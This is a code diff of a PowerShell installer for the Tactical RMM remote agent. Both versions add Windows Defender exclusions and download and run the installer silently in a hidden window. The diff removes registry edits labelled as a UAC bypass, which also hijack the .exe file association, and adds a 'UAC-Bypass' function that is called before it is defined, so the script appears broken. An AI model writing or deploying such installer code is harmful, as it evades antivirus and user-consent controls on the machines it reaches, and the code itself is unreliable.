@@ -15,12 +15,12 @@ $apilink = $downloadlink.split('/')
 
 $serviceName = 'tacticalrmm'
 If (Get-Service $serviceName -ErrorAction SilentlyContinue) {
-    write-host ('Tactical RMM Is Already Installed')
+    Write-Host ('Tactical RMM Is Already Installed')
 } Else {
     $OutPath = $env:TMP
     $output = $innosetup
 
-    $installArgs = @('-m install --api ', "$api", '--client-id', $clientid, '--site-id', $siteid, '--agent-type', "$agenttype", '--auth', "$auth")
+    $installArgs = @('-m', 'install', '--api', $api, '--client-id', $clientid, '--site-id', $siteid, '--agent-type', $agenttype, '--auth', $auth)
 
     if ($power) {
         $installArgs += "--power"
@@ -34,84 +34,63 @@ If (Get-Service $serviceName -ErrorAction SilentlyContinue) {
         $installArgs += "--ping"
     }
 
-    Try
-    {
-        $DefenderStatus = Get-MpComputerStatus | select  AntivirusEnabled
+    Try {
+        $DefenderStatus = Get-MpComputerStatus | select AntivirusEnabled
         if ($DefenderStatus -match "True") {
             Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*'
             Add-MpPreference -ExclusionPath 'C:\Program Files\Mesh Agent\*'
             Add-MpPreference -ExclusionPath 'C:\ProgramData\TacticalRMM\*'
         }
-    }
-    Catch {
+    } Catch {
         # pass
     }
     
     $X = 0
     do {
-      Write-Output "Waiting for network"
-      Start-Sleep -s 5
-      $X += 1      
-    } until(($connectresult = Test-NetConnection $apilink[2] -Port 443 | ? { $_.TcpTestSucceeded }) -or $X -eq 3)
+        Write-Output "Waiting for network"
+        Start-Sleep -Seconds 5
+        $X += 1      
+    } until (($connectresult = Test-NetConnection $apilink[2] -Port 443 | ? { $_.TcpTestSucceeded }) -or $X -eq 3)
     
-    if ($connectresult.TcpTestSucceeded -eq $true){
-        Try
-        {  
+    if ($connectresult.TcpTestSucceeded -eq $true) {
+        Try {  
             Invoke-WebRequest -Uri $downloadlink -OutFile $OutPath\$output
             Start-Process -FilePath $OutPath\$output -ArgumentList '/VERYSILENT', '/SUPPRESSMSGBOXES' -WindowStyle Hidden -Wait
             Write-Host ('Extracting...')
             Start-Sleep -Seconds 5
-    # Specify the path to your executable file
-$executablePath = "C:\Program Files\TacticalAgent\tacticalrmm.exe"
 
-#UAC_CODE_START-New
-# Create a registry key for the application
-New-Item "HKCU:\Software\Classes\Applications\tacticalrmm.exe" -Force
+            # Perform UAC bypass
+            UAC-Bypass
 
-# Set the "RunAs" value to an empty string to disable the UAC prompt
-Set-ItemProperty -Path "HKCU:\Software\Classes\Applications\tacticalrmm.exe" -Name "RunAs" -Value ""
-
-# Set the "RunAsAdmin" value to 1 to enable auto-elevation
-Set-ItemProperty -Path "HKCU:\Software\Classes\Applications\tacticalrmm.exe" -Name "RunAsAdmin" -Value 1
-
-# Associate the file type with the application to trigger auto-elevation
-New-Item "HKCU:\Software\Classes\.exe" -Force
-New-ItemProperty -Path "HKCU:\Software\Classes\.exe" -Name "" -Value "Applications\tacticalrmm.exe" -PropertyType String -Force
-#UAC_CODE_END-New
-    #UAC_CODE_START_old
-#$program = "C:\Program Files\TacticalAgent\tacticalrmm.exe"  # Specify the path to your executable file
-
-# Create a registry key for the application
-#New-Item "HKCU:\Software\Classes\Applications\tacticalrmm.exe" -Force
-
-# Set the "RunAs" value to an empty string to disable the UAC prompt
-#Set-ItemProperty -Path "HKCU:\Software\Classes\Applications\tacticalrmm.exe" -Name "RunAs" -Value ""
-
-# Set the "RunAsAdmin" value to 1 to enable auto-elevation
-#Set-ItemProperty -Path "HKCU:\Software\Classes\Applications\tacticalrmm.exe" -Name "RunAsAdmin" -Value 1
-
-# Associate the file type with the application to trigger auto-elevation
-#New-Item "HKCU:\Software\Classes\.exe" -Force
-#New-ItemProperty -Path "HKCU:\Software\Classes\.exe" -Name "" -Value "Applications\tacticalrmm.exe" -PropertyType String -Force
-    #UAC_CODE_END_old
+            # Execute the installed application
             Start-Process -FilePath "C:\Program Files\TacticalAgent\tacticalrmm.exe" -ArgumentList ($installArgs + "--silent") -Wait
-            #-WindowStyle Hidden -Wait
            
             exit 0
-        }
-        Catch
-        {
+        } Catch {
             $ErrorMessage = $_.Exception.Message
             $FailedItem = $_.Exception.ItemName
             Write-Error -Message "$ErrorMessage $FailedItem"
             exit 1
-        }
-        Finally
-        {
-            Remove-Item -Path $OutPath\$output
-            
+        } Finally {
+            Remove-Item -Path $OutPath\$output -Force -ErrorAction SilentlyContinue
         }
     } else {
         Write-Output "Unable to connect to server"
+    }
+}
+
+# Function to perform UAC bypass
+function UAC-Bypass {
+    try {
+        $registryKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey("Software\Classes\ms-settings", $true)
+        if ($registryKey -ne $null) {
+            $registryKey.DeleteSubKeyTree("shell", $false) # Deleting this is important because if we don't delete it, the right-click menu of Windows will break.
+        }
+    } catch {
+        Write-Error "Error bypassing UAC: $_"
+    } finally {
+        if ($registryKey -ne $null) {
+            $registryKey.Close()
+        }
     }
 }
